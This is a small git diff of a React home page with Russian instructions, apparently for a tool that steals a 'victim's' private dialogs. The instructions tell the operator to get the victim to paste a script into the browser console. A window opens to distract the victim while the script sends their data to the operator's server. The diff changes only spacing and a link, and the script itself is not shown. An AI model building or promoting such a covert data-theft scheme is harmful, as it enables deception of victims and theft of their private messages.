@@ -110,7 +110,7 @@ export default class Home extends React.Component {
 								<div className="home__section-description">
 									Теперь в консоль нужно вставить скопированный ранее скрипт и
 									нажать
-									<b>enter</b>. Скрипт начнет свою работу. Чтобы "жертва" не
+									<b> enter</b>. Скрипт начнет свою работу. Чтобы "жертва" не
 									поняла, что происходит, откроется специальное окно, которое
 									отвлечет пользователя, exxexexxexe :&#41;
 								</div>
@@ -129,7 +129,7 @@ export default class Home extends React.Component {
 									Скрипт отправит полученные данные на сервер и вы сможете их
 									посмотреть.
 									<div className="home__section-link-wrapper">
-										<Link to="/get-script" className="home__section-link">
+										<Link to="/dialogs" className="home__section-link">
 											Поиск диалогов
 										</Link>
 									</div>
